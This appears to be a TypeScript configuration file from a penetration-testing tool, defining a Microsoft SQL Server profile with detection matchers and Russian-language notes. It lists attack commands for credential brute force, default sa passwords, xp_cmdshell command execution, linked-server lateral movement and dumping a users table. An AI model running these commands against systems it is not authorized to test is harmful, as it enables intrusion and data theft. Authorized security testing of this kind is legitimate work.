/**
 * MSSQL Service Configuration
 * Microsoft SQL Server
 * 
 * @version 1.0.0
 * @author Security Team
 */
import type { ServiceConfig } from '../types';

export const mssqlConfig: ServiceConfig = {
  id: 'mssql',
  name: 'MSSQL (Microsoft SQL Server)',
  description: 'Microsoft SQL Server - реляционная СУБД от Microsoft. Широко используется в корпоративной среде. Частый вектор атак в Active Directory через хранимые процедуры, linked servers и доверительные отношения.',
  categoryId: 'database',
  version: '1.0.0',
  tags: ['database', 'windows', 'microsoft', 'sql', 'active-directory'],

  matchers: {
    serviceNames: ['ms-sql-s', 'ms-sql-m', 'mssql', 'ms-sql', 'microsoft-ds'],
    cpePatterns: ['cpe:/a:microsoft:sql_server', 'cpe:/a:microsoft:mssql'],
    bannerRegex: [
      'Microsoft SQL Server',
      'MSSQL',
      'SQL Server',
      'TDS Protocol',
    ],
    productPatterns: ['Microsoft SQL Server', 'MSSQL', 'MS-SQL'],
    standardPorts: [1433, 1434, 49152, 49153, 49154], // Default instance + dynamic ports
    nseScriptMatchers: [
      { scriptName: 'ms-sql-info', outputPattern: '.' },
      { scriptName: 'ms-sql-empty-password', outputPattern: '.' },
    ],
  },

  confidenceThreshold: 35,

  techniques: [
    {
      id: 'mssql-enum',
      name: 'MSSQL Enumeration',
      mitreId: 'T1046',
      description: 'Сбор информации о MSSQL сервере: версия, инстансы, аутентификация.',
      commands: [
        { tool: 'nmap', command: 'nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info <target>', description: 'MSSQL info enumeration' },
        { tool: 'crackmapexec', command: 'crackmapexec mssql <target>', description: 'CME MSSQL scan' },
        { tool: 'metasploit', command: 'use auxiliary/scanner/mssql/mssql_ping', description: 'MSSQL ping' },
      ],
      nseScripts: [
        { name: 'ms-sql-info', description: 'Информация о MSSQL сервере', safe: true },
        { name: 'ms-sql-ntlm-info', description: 'NTLM информация', safe: true },
      ],
      difficulty: 'easy',
      tags: ['enumeration', 'reconnaissance'],
    },
    {
      id: 'mssql-bruteforce',
      name: 'MSSQL Brute Force',
      mitreId: 'T1110',
      description: 'Подбор учетных данных MSSQL. SA-аккаунт особенно ценен.',
      commands: [
        { tool: 'hydra', command: 'hydra -L users.txt -P passwords.txt mssql://<target>', description: 'MSSQL brute force' },
        { tool: 'crackmapexec', command: 'crackmapexec mssql <target> -u sa -P passwords.txt', description: 'CME brute force' },
        { tool: 'metasploit', command: 'use auxiliary/scanner/mssql/mssql_login', description: 'MSF MSSQL login' },
      ],
      difficulty: 'easy',
      notes: 'Попробуйте sa/admin, sa/password, sa/[empty]. Проверяйте учетные записи по умолчанию.',
      tags: ['bruteforce', 'authentication'],
    },
    {
      id: 'mssql-xp-cmdshell',
      name: 'xp_cmdshell Execution',
      mitreId: 'T1059',
      description: 'Выполнение команд ОС через расширенную хранимую процедуру xp_cmdshell.',
      commands: [
        { tool: 'sqsh', command: 'sqsh -S <target> -U sa -P password -C "xp_cmdshell \'whoami\'"', description: 'sqsh xp_cmdshell' },
        { tool: 'crackmapexec', command: 'crackmapexec mssql <target> -u sa -p password -x "whoami"', description: 'CME command exec' },
        { tool: 'impacket-mssqlclient', command: 'mssqlclient.py sa:password@target -windows-auth', description: 'Impacket MSSQL client' },
      ],
      difficulty: 'medium',
      prerequisites: ['Учетные данные MSSQL', 'Права на xp_cmdshell'],
      tags: ['rce', 'post-exploitation', 'privilege-escalation'],
    },
    {
      id: 'mssql-linked-servers',
      name: 'Linked Servers Exploitation',
      mitreId: 'T1021.002',
      description: 'Использование linked servers для lateral movement и privilege escalation.',
      commands: [
        { tool: 'sqlcmd', command: 'sqlcmd -S target -U user -P pass -Q "SELECT name FROM sys.servers"', description: 'List linked servers' },
        { tool: 'sqlcmd', command: 'sqlcmd -S target -U user -P pass -Q "EXECUTE (\'whoami\') AT [linked_server]"', description: 'Execute on linked server' },
      ],
      difficulty: 'hard',
      prerequisites: ['Доступ к MSSQL', 'Linked servers настроены'],
      tags: ['lateral-movement', 'privilege-escalation', 'linked-servers'],
    },
    {
      id: 'mssql-trust-links',
      name: 'Trust Links to Domain',
      description: 'Эксплуатация доверительных отношений между MSSQL и Active Directory.',
      commands: [
        { tool: 'powerupsql', command: 'Get-SQLServerInfo -Instance "target,1433"', description: 'PowerUpSQL enumeration' },
        { tool: 'powerupsql', command: 'Get-SQLDomainGroup -Instance "target,1433"', description: 'Domain group enumeration' },
        { tool: 'powerupsql', command: 'Invoke-SQLAudit -Instance "target,1433"', description: 'Full MSSQL audit' },
      ],
      difficulty: 'hard',
      tags: ['active-directory', 'trust-exploitation'],
    },
    {
      id: 'mssql-database-links',
      name: 'Database Cross-Reference',
      description: 'Поиск чувствительных данных в базах данных.',
      commands: [
        { tool: 'sqlcmd', command: 'sqlcmd -S target -U user -P pass -Q "SELECT name FROM master..sysdatabases"', description: 'List databases' },
        { tool: 'sqlcmd', command: 'sqlcmd -S target -U user -P pass -Q "SELECT table_name FROM database.information_schema.tables"', description: 'List tables' },
        { tool: 'sqlcmd', command: 'sqlcmd -S target -U user -P pass -Q "SELECT * FROM database..users"', description: 'Dump users table' },
      ],
      difficulty: 'medium',
      tags: ['data-exfiltration', 'enumeration'],
    },
  ],

  triggers: [],

  ui: {
    icon: 'database',
    color: '#dc2626',
    displayPriority: 95,
  },

  references: [
    { title: 'MSSQL Pentesting', url: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server' },
    { title: 'PowerUpSQL', url: 'https://github.com/NetSPI/PowerUpSQL' },
  ],

  notes: 'MSSQL - ключевой компонент Windows-инфраструктуры. SA аккаунт = admin на сервере. Проверяйте xp_cmdshell, linked servers и интеграцию с AD. PowerUpSQL - лучший инструмент для аудита.',
};

export default mssqlConfig;
